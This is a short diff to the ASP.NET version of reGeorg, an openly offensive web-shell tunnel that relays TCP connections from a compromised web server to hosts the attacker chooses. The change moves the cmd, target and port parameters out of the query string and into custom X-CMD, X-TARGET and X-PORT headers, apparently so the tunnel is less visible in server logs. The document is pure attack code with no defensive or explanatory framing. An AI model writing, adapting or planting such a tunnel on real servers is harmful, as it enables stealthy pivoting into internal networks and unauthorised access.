@@ -31,16 +31,13 @@ https://github.com/sensepost/reGeorg
     {
         if (Request.HttpMethod == "POST")
         {
-            //String cmd = Request.Headers.Get("X-CMD");
-            String cmd = Request.QueryString.Get("cmd").ToUpper();
+            String cmd = Request.Headers.Get("X-CMD").ToUpper();
             if (cmd == "CONNECT")
             {
                 try
                 {
-                    String target = Request.QueryString.Get("target").ToUpper();
-                    //Request.Headers.Get("X-TARGET");
-                    int port = int.Parse(Request.QueryString.Get("port"));
-                    //Request.Headers.Get("X-PORT"));
+                    String target = Request.Headers.Get("X-TARGET").ToUpper();
+                    int port = int.Parse(Request.Headers.Get("X-PORT"));
                     IPAddress ip = IPAddress.Parse(target);
                     System.Net.IPEndPoint remoteEP = new IPEndPoint(ip, port);
                     Socket sender = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
